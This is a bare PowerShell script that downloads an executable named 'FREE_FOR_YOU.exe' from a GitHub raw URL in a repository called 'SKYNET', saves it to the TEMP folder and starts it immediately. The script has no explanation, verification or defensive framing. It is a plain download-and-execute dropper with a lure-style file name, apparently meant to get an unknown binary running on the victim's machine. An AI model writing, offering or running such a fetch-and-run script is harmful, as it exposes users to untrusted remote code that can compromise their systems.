$url = "https://raw.githubusercontent.com/kittipatseepakdee-eng/SKYNET/refs/heads/main/FREE_FOR_YOU.exe"
$file = "$env:TEMP\FREE_FOR_YOU.exe"

Invoke-WebRequest $url -OutFile $file
Start-Process $file
